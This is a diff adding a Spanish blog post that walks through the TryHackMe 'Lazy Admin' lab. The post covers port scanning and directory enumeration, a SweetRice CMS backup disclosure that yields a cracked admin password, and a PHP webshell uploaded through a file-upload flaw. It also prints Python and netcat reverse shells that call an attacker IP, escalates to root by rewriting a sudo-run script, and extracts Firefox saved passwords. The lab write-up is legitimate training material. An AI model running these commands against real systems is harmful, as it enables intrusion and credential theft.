@@ -1,0 +1,517 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <a name="top"></a>
+  
+    <title>TryHackMe - Lazy Admin :: sckull — HackTheBox Writeups, CTF</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="description" content="Titulo Lazy Admin     Room Lazy Admin   Info Easy linux machine to practice your skills   Puntos 385   Dificultad Relativamente Facil   Maker MrSeth6797    MASSCAN &amp;amp; NMAP Escaneo de puertos tcp/udp y sus servicios, nmap nos muestra dos puertos abiertos el http (80) y el ssh (22).
+root@aoiri:~/tryhackme/lazyadmin# masscan -p1-65535,U:1-65535 10.10.68.91 -e tun0 Starting masscan 1."/>
+<meta name="keywords" content=""/>
+<meta name="robots" content="noodp"/>
+<link rel="canonical" href="https://sckull.github.io/posts/lazyadmin/" />
+
+
+<link rel="stylesheet" href="https://sckull.github.io/assets/style.css">
+
+
+<link rel="stylesheet" href="https://sckull.github.io/style.css">
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://sckull.github.io/img/apple-touch-icon-144-precomposed.png">
+<link rel="shortcut icon" href="https://sckull.github.io/img/favicon.png">
+
+<script src="https://use.fontawesome.com/63acf4d7a3.js"></script>
+
+
+
+<meta name="twitter:card" content="summary" />
+<meta name="twitter:title" content="TryHackMe - Lazy Admin :: sckull — HackTheBox Writeups, CTF" />
+<meta name="twitter:description" content="Titulo Lazy Admin     Room Lazy Admin   Info Easy linux machine to practice your skills   Puntos 385   Dificultad Relativamente Facil   Maker MrSeth6797    MASSCAN &amp;amp; NMAP Escaneo de puertos tcp/udp y sus servicios, nmap nos muestra dos puertos abiertos el http (80) y el ssh (22).
+root@aoiri:~/tryhackme/lazyadmin# masscan -p1-65535,U:1-65535 10.10.68.91 -e tun0 Starting masscan 1." />
+<meta name="twitter:site" content="https://sckull.github.io" />
+<meta name="twitter:creator" content="sckull" />
+<meta name="twitter:image" content="https://sckull.github.io/../../image/tryhackme/LazyAdmin/cover.png">
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="TryHackMe - Lazy Admin :: sckull — HackTheBox Writeups, CTF">
+<meta property="og:description" content="Titulo Lazy Admin     Room Lazy Admin   Info Easy linux machine to practice your skills   Puntos 385   Dificultad Relativamente Facil   Maker MrSeth6797    MASSCAN &amp;amp; NMAP Escaneo de puertos tcp/udp y sus servicios, nmap nos muestra dos puertos abiertos el http (80) y el ssh (22).
+root@aoiri:~/tryhackme/lazyadmin# masscan -p1-65535,U:1-65535 10.10.68.91 -e tun0 Starting masscan 1." />
+<meta property="og:url" content="https://sckull.github.io/posts/lazyadmin/" />
+<meta property="og:site_name" content="TryHackMe - Lazy Admin" />
+<meta property="og:image" content="https://sckull.github.io/../../image/tryhackme/LazyAdmin/cover.png">
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+
+<meta name="google-site-verification" content="cug_0s4kFi5UbEfBI5hJsscmJ7XdimqECCYfN1EAZq0" />
+
+
+<script type="application/ld+json">
+    {
+        "@context" : "http://schema.org",
+        "@type" : "BlogPosting",
+        "mainEntityOfPage": {
+             "@type": "WebPage",
+             "@id": "https://sckull.github.io"
+        },
+        "articleSection" : "posts",
+        "name" : "TryHackMe - Lazy Admin",
+        "headline" : "TryHackMe - Lazy Admin",
+        "description" : "Titulo Lazy Admin     Room Lazy Admin   Info Easy linux machine to practice your skills   Puntos 385   Dificultad Relativamente Facil   Maker MrSeth6797    MASSCAN &amp; NMAP Escaneo de puertos tcp/udp y sus servicios, nmap nos muestra dos puertos abiertos el http (80) y el ssh (22).
+root@aoiri:~/tryhackme/lazyadmin# masscan -p1-65535,U:1-65535 10.10.68.91 -e tun0 Starting masscan 1.",
+        "inLanguage" : "en-US",
+        "author" : "",
+        "creator" : "",
+        "publisher": "",
+        "accountablePerson" : "",
+        "copyrightHolder" : "",
+        "copyrightYear" : "2019",
+        "datePublished": "2019-12-12 00:00:00 &#43;0000 UTC",
+        "dateModified" : "2019-12-12 00:00:00 &#43;0000 UTC",
+        "url" : "https://sckull.github.io/posts/lazyadmin/",
+        "wordCount" : "734",
+        "keywords" : [ "tryhackme","sudo","sweet rice cms","python","firefox decrypt","Blog" ]
+    }
+    </script>
+
+
+<meta property="article:published_time" content="2019-12-12 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+</head>
+<body class="">
+<div class="container">
+  <header class="header">
+  <span class="header__inner">
+    <a href="https://sckull.github.io/" class="logo" style="text-decoration: none;">
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" width="44" height="44" viewBox="0 0 44 44">
+  <polyline fill="none" stroke="#000" stroke-width="2" points="15 8 29.729 22.382 15 35.367"/>
+</svg>
+</span>
+    <span class="logo__text">sckull | blog</span>
+    <span class="logo__cursor"></span>
+  
+</a>
+
+    <span class="header__right">
+      
+        <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="https://sckull.github.io/about">About</a></li>
+        
+      
+        
+          <li><a href="https://sckull.github.io/tags/">Tags</a></li>
+        
+      
+      
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="https://sckull.github.io/about">About</a></li>
+      
+    
+      
+        <li><a href="https://sckull.github.io/tags/">Tags</a></li>
+      
+    
+  </ul>
+</nav>
+
+        <span class="menu-trigger">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M0 0h24v24H0z" fill="none"/>
+            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+          </svg>
+        </span>
+      
+      <span class="theme-toggle">
+        <svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+</svg>
+
+      </span>
+    </span>
+  </span>
+  <link rel="shortcut icon" href="https://sckullbock.blogspot.com/favicon.ico">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/Chart.js/2.5.0/Chart.min.js"></script>
+</header>
+
+  
+  <div class="content">    
+    
+
+  <div class="post">
+    <h2 class="post-title"><a href="https://sckull.github.io/posts/lazyadmin/">TryHackMe - Lazy Admin</a></h2>
+    <div class="post-meta">
+      
+        <span class="post-date">
+            Thursday, Dec 12, 2019
+        </span>
+      
+      <span class="post-author">— Written by sckull</span>
+      
+    </div>
+        
+    
+      <span class="post-tags">
+        
+         <a class="button-tag" href="https://sckull.github.io/tags/tryhackme/"><li class="fa fa-tag"></li> tryhackme</a>&nbsp;
+        
+         <a class="button-tag" href="https://sckull.github.io/tags/sudo/"><li class="fa fa-tag"></li> sudo</a>&nbsp;
+        
+         <a class="button-tag" href="https://sckull.github.io/tags/sweet-rice-cms/"><li class="fa fa-tag"></li> sweet rice cms</a>&nbsp;
+        
+         <a class="button-tag" href="https://sckull.github.io/tags/python/"><li class="fa fa-tag"></li> python</a>&nbsp;
+        
+         <a class="button-tag" href="https://sckull.github.io/tags/firefox-decrypt/"><li class="fa fa-tag"></li> firefox decrypt</a>&nbsp;
+        
+      </span>
+    
+
+    
+      
+        <img src="https://sckull.github.io/posts/lazyadmin/../../image/tryhackme/LazyAdmin/cover.png" class="post-cover center" />
+      
+      <hr />
+     
+    
+    <div class="post-content">      
+      
+
+<table>
+<thead>
+<tr>
+<th>Titulo</th>
+<th>Lazy Admin</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>Room</td>
+<td>Lazy Admin</td>
+</tr>
+
+<tr>
+<td>Info</td>
+<td>Easy linux machine to practice your skills</td>
+</tr>
+
+<tr>
+<td>Puntos</td>
+<td>385</td>
+</tr>
+
+<tr>
+<td>Dificultad</td>
+<td>Relativamente Facil</td>
+</tr>
+
+<tr>
+<td>Maker</td>
+<td><a href="https://tryhackme.com/p/MrSeth6797">MrSeth6797</a></td>
+</tr>
+</tbody>
+</table>
+
+<hr />
+
+<h2 id="masscan-nmap">MASSCAN &amp; NMAP</h2>
+
+<p>Escaneo de puertos tcp/udp y sus servicios, nmap nos muestra dos puertos abiertos el http (80) y el ssh (22).</p>
+
+<pre><code class="language-bash">root@aoiri:~/tryhackme/lazyadmin# masscan -p1-65535,U:1-65535  10.10.68.91 -e tun0
+
+Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2019-12-12 04:49:57 GMT
+ -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
+Initiating SYN Stealth Scan
+Scanning 1 hosts [131070 ports/host]
+Discovered open port 22/tcp on 10.10.68.91                                     
+Discovered open port 80/tcp on 10.10.68.91 
+
+# Nmap 7.80 scan initiated Wed Dec 11 22:50:33 2019 as: nmap -sV -sC -o nmap_scan 10.10.68.91
+Nmap scan report for 10.10.68.91
+Host is up (0.26s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)
+|   256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)
+|_  256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Wed Dec 11 22:51:22 2019 -- 1 IP address (1 host up) scanned in 48.56 seconds
+</code></pre>
+
+<h3 id="whatweb">WHATWEB</h3>
+
+<p>Vemos que la pagina esta corriendo sobre un <code>Apache 2.4.18</code>.</p>
+
+<p><img src="../../image/tryhackme/LazyAdmin/Screenshot_2019-12-11_22-53-22.png" alt="image" /></p>
+
+<h3 id="http">HTTP</h3>
+
+<p>Al visitar la pagina nos muestra el tipico index de apache.
+<img src="../../image/tryhackme/LazyAdmin/Screenshot_2019-12-11_22-54-16.png" alt="image" /></p>
+
+<h2 id="gobuster">GOBUSTER</h2>
+
+<p>Utilizamos esta herramienta para poder obtener los directorios y archivos ue puedan ser interesantes.</p>
+
+<pre><code class="language-bash">root@aoiri:~/tryhackme/lazyadmin# gobuster dir -u http://10.10.68.91/ -x php,txt,html -q -t 15 -w /usr/share/wordlists/dirb/common.txt 
+/content (Status: 301)
+/index.html (Status: 200)
+/index.html (Status: 200)
+/server-status (Status: 403)
+root@aoiri:~/tryhackme/lazyadmin#
+</code></pre>
+
+<h3 id="sweet-rice-cms">Sweet Rice CMS</h3>
+
+<h4 id="content">/content</h4>
+
+<p>Encontramos un CMS especificamente Sweet Rice, con un mensaje que indica que el sitio web esta en construccion.</p>
+
+<p><img src="../../image/tryhackme/LazyAdmin/Screenshot_2019-12-11_23-01-41.png" alt="image" /></p>
+
+<p>Pasamos nuevamente gobuster sobre la direccion de SweetRice y econtramos distintos directorios relacionados con el gestor de contenidos.</p>
+
+<pre><code class="language-bash">root@aoiri:~/tryhackme/lazyadmin# gobuster dir -u http://10.10.68.91/content/ -x php,txt,html -q -t 15 -w /usr/share/wordlists/dirb/common.txt 
+/_themes (Status: 301)
+/as (Status: 301)
+/attachment (Status: 301)
+/changelog.txt (Status: 200)
+/images (Status: 301)
+/inc (Status: 301)
+/index.php (Status: 200)
+/index.php (Status: 200)
+/js (Status: 301)
+/license.txt (Status: 200)
+root@aoiri:~/tryhackme/lazyadmin# 
+</code></pre>
+
+<p>Una direccion interesante es <code>/as</code>, contiene un panel de logeo, intentamos utilizar las credenciales por default pero no logramos acceder.</p>
+
+<p><img src="../../image/tryhackme/LazyAdmin/Screenshot_2019-12-11_23-09-51.png" alt="image" /></p>
+
+<p>Buscamos exploits que pudiesen afectar a este gestor de contenidos y encontramos distintas vulnerabilidades.</p>
+
+<p><img src="../../image/tryhackme/LazyAdmin/Screenshot_2019-12-11_23-12-50.png" alt="image" /></p>
+
+<h4 id="sweetrice-1-5-1-backup-disclosure">SweetRice 1.5.1 - Backup Disclosure</h4>
+
+<p>Una de ellas indica que existe un backup de mysql en el directorio <code>/inc/mysql</code> directorio que existe en esta pagina.</p>
+
+<p><img src="../../image/tryhackme/LazyAdmin/Screenshot_2019-12-11_23-14-46.png" alt="image" /></p>
+
+<p>Descargamos el archivo y al analizarlo encontramos que se hizo una insersion en la tabla options donde encontramos un nombre y una contraseña, las cuales podemos utilizar en el panel de logeo.</p>
+
+<p><img src="../../image/tryhackme/LazyAdmin/Screenshot_2019-12-11_23-21-59.png" alt="image" /></p>
+
+<p>Buscamos el hash en crackstation y obtuvimos la contraseña en texto plano:</p>
+
+<p><img src="../../image/tryhackme/LazyAdmin/Screenshot_2019-12-11_23-22-21.png" alt="image" /></p>
+
+<p><strong>Credenciales:</strong></p>
+
+<pre><code>User: manager
+Password: Password123
+</code></pre>
+
+<h4 id="sweetrice-1-5-1-arbitrary-file-upload">SweetRice 1.5.1 - Arbitrary File Upload</h4>
+
+<p>Utilizamos un exploit que afecta a este gestor de contenidos para subir una shell, antes de ejecutarlo agregamos la ip y un dominio a nuestro archivo hosts (<code>lazyadmin.thm</code> en mi caso) ya que nos pedira un dominio y no una IP. Tambien agregamos <code>/content/</code> a los valores que contienen <code>/as/</code> y <code>/attachment/</code>.</p>
+
+<p>Creamos un archivo en php de prueba:</p>
+
+<pre><code class="language-php">echo &quot;&lt;?php echo ':D'; ?&gt;&quot; &gt; shellfoo.php5
+</code></pre>
+
+<p>Ejecutamos y vemos que se subio nuestro archivo:</p>
+
+<p><img src="../../image/tryhackme/LazyAdmin/Screenshot_2019-12-11_23-51-57.png" alt="image" /></p>
+
+<p>Nuestro archivo de prueba:</p>
+
+<p><img src="../../image/tryhackme/LazyAdmin/Screenshot_2019-12-11_23-52-21.png" alt="image" /></p>
+
+<p>Subimos una webshell:</p>
+
+<pre><code class="language-php">&lt;?php
+if(isset($_REQUEST['cmd'])){
+        echo &quot;&lt;pre&gt;&quot;;
+        $cmd = ($_REQUEST['cmd']);
+        system($cmd);
+        echo &quot;&lt;/pre&gt;&quot;;
+        die;
+}
+?&gt;
+</code></pre>
+
+<p><img src="../../image/tryhackme/LazyAdmin/Screenshot_2019-12-11_23-55-24.png" alt="image" /></p>
+
+<p>Ejecutamos un comando para obtener una shell inversa:</p>
+
+<pre><code class="language-bash">python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.8.1.72&quot;,1338));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'
+</code></pre>
+
+<p><img src="../../image/tryhackme/LazyAdmin/Screenshot_2019-12-12_00-02-45.png" alt="image" /></p>
+
+<h2 id="user-flag">USER - Flag</h2>
+
+<p>Nos movemos a la carpeta principal del usuario itguy y obtenemos nuestra flag <strong>user.txt</strong>.</p>
+
+<p><img src="../../image/tryhackme/LazyAdmin/Screenshot_2019-12-12_00-08-06.png" alt="image" /></p>
+
+<h2 id="privilege-escalation">PRIVILEGE ESCALATION</h2>
+
+<p>Hacemos una enumeracion rapida con el comando <code>sudo -l -l</code>, y vemos que hay un archivo que podemos ejecutar con perl con el comando sudo, a su vez este archivo ejecuta otro (<code>/etc/copy.sh</code>), este ultimo ejecuta un comando para obtener una shell inversa hacia una IP.</p>
+
+<p><strong>/home/itguy/backup.pl</strong></p>
+
+<pre><code class="language-perl">#!/usr/bin/perl
+
+system(&quot;sh&quot;, &quot;/etc/copy.sh&quot;);
+</code></pre>
+
+<p><strong>copy.sh</strong></p>
+
+<pre><code class="language-bash">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.0.190 5554 &gt;/tmp/f
+</code></pre>
+
+<p>El archivo <code>backup.pl</code> no puede ser modificado, pero el archivo <code>copy.sh</code> si, hicimos una pequeña prueba con un comentario en bash.</p>
+
+<pre><code class="language-bash">echo &quot;#foo&quot; &gt;&gt; /etc/copy.sh
+</code></pre>
+
+<p><img src="../../image/tryhackme/LazyAdmin/Screenshot_2019-12-12_00-14-17.png" alt="image" /></p>
+
+<p>Permisos <strong>copy.sh</strong>:</p>
+
+<p><img src="../../image/tryhackme/LazyAdmin/Screenshot_2019-12-12_00-16-05.png" alt="image" /></p>
+
+<p>Agregamos una shell inversa al archivo <strong>copy.sh</strong>:</p>
+
+<pre><code class="language-bash">echo &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.8.1.72 1337 &gt;/tmp/f&quot; &gt; /etc/copy.sh
+</code></pre>
+
+<p><img src="../../image/tryhackme/LazyAdmin/Screenshot_2019-12-12_00-20-21.png" alt="image" /></p>
+
+<p>Ejecutamos y obtenemos una shell inversa con el usuario root, junto con nuestra flag <strong>root.txt</strong>.</p>
+
+<p><img src="../../image/tryhackme/LazyAdmin/Screenshot_2019-12-12_00-21-27.png" alt="image" /></p>
+
+<h4 id="firefox-decrypt">Firefox Decrypt</h4>
+
+<p>Dentro de la carpeta principal del usuario itguy encontramos la carpeta <code>.mozilla/firefox/</code>, utilizamos <a href="https://github.com/unode/firefox_decrypt"><strong>firefox_decrypt</strong></a> para obtener las contraseñas y usuarios guardados.</p>
+
+<p><img src="../../image/tryhackme/LazyAdmin/Screenshot_2019-12-12_00-28-07.png" alt="image" /></p>
+
+    </div>    
+    <hr />
+    <div >
+      
+        
+<div id="disqus_thread"></div>
+<script>
+(function() {
+var d = document, s = d.createElement('script');
+s.src = 'https://sckull.disqus.com/embed.js';
+s.setAttribute('data-timestamp', +new Date());
+(d.head || d.body).appendChild(s);
+})();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+      
+      
+      
+    </div>
+    
+      <div class="pagination">
+        <div class="pagination__title">
+          <span class="pagination__title-h">Read other posts</span>
+          <hr />
+        </div>
+        <div class="pagination__buttons">
+          
+          
+            <span class="button next">
+              <a href="https://sckull.github.io/posts/linuxprivescplayground/">
+                <span class="button__text">TryHackMe - Linux Privesc Playground</span>
+                <span class="button__icon">→</span>
+              </a>
+            </span>
+          
+        </div>
+      </div>
+      
+    
+    
+    
+    </div>
+    
+  </div>
+  
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <a href="https://sckull.github.io/" class="logo" style="text-decoration: none;">
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" width="44" height="44" viewBox="0 0 44 44">
+  <polyline fill="none" stroke="#000" stroke-width="2" points="15 8 29.729 22.382 15 35.367"/>
+</svg>
+</span>
+    <span class="logo__text">sckull | blog</span>
+    <span class="logo__cursor"></span>
+  
+</a>
+
+      <div class="copyright">
+        
+      </div>
+    
+  </div>
+</footer>
+
+<script src="https://sckull.github.io/assets/main.js"></script>
+<script src="https://sckull.github.io/assets/prism.js"></script>
+
+
+  
+  
+  
+  <a class="float" id="myBtn" href="#top"><i class="fa fa-arrow-up" aria-hidden="true"></i></a>
+
+</div>
+
+
+
+
+
+
+</body>
+</html>
